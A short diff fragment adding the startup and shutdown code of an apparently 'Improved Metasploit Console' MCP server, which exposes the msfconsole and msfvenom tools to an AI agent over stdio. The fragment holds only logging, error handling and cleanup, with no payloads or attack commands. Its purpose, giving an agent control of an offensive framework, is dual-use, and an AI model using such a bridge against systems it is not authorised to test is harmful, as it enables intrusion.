+    print(f"Using msfconsole at: {CONFIG['metasploit']['msfconsole_path']}")
+    print(f"Using msfvenom at: {CONFIG['metasploit']['msfvenom_path']}")
+    
+    try:
+        # Run the server
+        print("Running MCP server...")
+        mcp.run(transport="stdio")
+    except KeyboardInterrupt:
+        print("\nShutting down Improved Metasploit Console MCP server...")
+        logger.info("Server stopped by keyboard interrupt")
+        
+        # Clean up any remaining temporary files
+        msf_executor.cleanup()
+        sys.exit(0)
+    except Exception as e:
+        logger.error(f"Error running MCP server: {e}")
+        print(f"Error: {e}")
+        
+        # Clean up any remaining temporary files
+        msf_executor.cleanup()
+        
+        # Print traceback for easier debugging
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
